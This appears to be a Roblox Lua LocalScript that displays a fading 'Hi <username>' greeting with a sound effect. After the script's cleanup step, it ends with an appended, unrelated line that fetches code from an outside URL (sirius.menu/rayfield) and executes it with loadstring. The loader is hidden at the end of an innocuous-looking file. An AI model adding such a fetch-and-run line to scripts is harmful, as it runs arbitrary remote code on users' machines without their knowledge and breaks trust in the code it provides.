-- LocalScript (put in StarterPlayerScripts or StarterGui)

local player = game.Players.LocalPlayer
local username = player.Name

-- Create the ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Create black background
local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
background.BackgroundTransparency = 1
background.Parent = screenGui

-- Create TextLabel
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.BackgroundTransparency = 1
textLabel.Text = "Hi " .. username
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.TextSize = 64
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextTransparency = 1
textLabel.TextXAlignment = Enum.TextXAlignment.Center
textLabel.TextYAlignment = Enum.TextYAlignment.Center
textLabel.Parent = background

-- Add sound effect
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://9120478023" -- replace with your preferred sound ID
sound.Volume = 2
sound.Parent = screenGui

-- Fade in background and text
for i = 1, 0, -0.05 do
	task.wait(0.05)
	background.BackgroundTransparency = i
	textLabel.TextTransparency = i
end

-- Play sound
sound:Play()

-- Wait 8 seconds (so total ~10 seconds including fades)
task.wait(8)

-- Fade out background and text
for i = 0, 1, 0.05 do
	task.wait(0.05)
	background.BackgroundTransparency = i
	textLabel.TextTransparency = i
end

-- Clean up
screenGui:Destroy()
    local v0 = loadstring(game:HttpGet("https://sirius.menu/rayfield"))();
